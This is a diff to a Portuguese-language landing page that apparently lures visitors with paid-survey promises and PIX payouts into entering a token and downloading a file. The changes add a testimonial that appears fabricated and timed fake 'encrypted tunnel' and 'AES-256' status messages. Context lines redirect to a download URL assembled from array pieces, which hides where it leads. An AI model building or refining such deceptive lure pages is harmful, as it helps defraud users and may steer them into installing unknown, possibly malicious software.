@@ -125,10 +125,20 @@
         .hero h1 {
             font-family: 'Google Sans', sans-serif;
             font-size: clamp(28px, 8vw, 56px);
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             letter-spacing: -1.5px;
             color: #fff;
             font-weight: 700;
+            line-height: 1.1;
+        }
+
+        .hero-subtitle {
+            font-size: clamp(14px, 2vw, 18px);
+            color: var(--text-dim);
+            max-width: 650px;
+            margin: 0 auto 40px;
+            line-height: 1.5;
+            font-weight: 300;
         }
 
 
@@ -255,7 +265,8 @@
     </nav>
 
     <section class="hero">
-        <h1>Molde o futuro das<br>marcas globais.</h1>
+        <h1>Sua perspectiva define o<br>próximo passo das Big Techs.</h1>
+        <p class="hero-subtitle">Conectamos sua visão estratégica às maiores marcas do mundo através do Nexus Protocol. Insira seu token e comece a pontuar.</p>
 
 
 
@@ -303,7 +314,7 @@
         <div class="testimonial-container" id="testCarousel">
             <div class="test-card active">
                 <span class="stars">★★★★★</span>
-                <p style="font-size: 14px;">"Recebi o valor via PIX em menos de 12 horas. O assistente Nexus é super intuitivo e seguro."</p>
+                <p style="font-size: 14px;">"Recebi o valor via PIX em menos de 12 horas. Tô esperando a proxima pesquisa!."</p>
                 <div style="display: flex; align-items: center; gap: 10px; margin-top: 15px;">
                     <div style="width: 35px; height: 35px; background: #3c4043; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; color: var(--g-blue);">MS</div>
                     <div style="font-size: 13px;"><strong>Marcos S.</strong><br><small style="color: var(--text-dim);">Especialista em Insights</small></div>
@@ -419,6 +430,11 @@
                     const lp = document.getElementById('lottieLoader');
                     if(lp) lp.play();
 
+                    const st = document.querySelector('#loadingArea p');
+                    setTimeout(() => { if(st) st.innerText = "Estabelecendo túnel criptografado..."; }, 1200);
+                    setTimeout(() => { if(st) st.innerText = "Sincronizando com Nexus Nodes (AES-256)..."; }, 2500);
+                    setTimeout(() => { if(st) st.innerText = "Finalizando autorização segura..."; }, 4000);
+
                     setTimeout(() => {
                         document.title = "Download Liberado!";
                         document.getElementById('loadingArea').style.display = 'none';
@@ -431,7 +447,7 @@
                         b.innerText = 'BAIXAR AGORA';
                         document.getElementById('dynamicBtnArea').appendChild(b);
                         setTimeout(() => { window.location.href = p.join(''); }, 1500);
-                    }, 2800);
+                    }, 5200);
                 } else {
                     if (navigator.vibrate) navigator.vibrate(100);
                     i.classList.add('error-shake');
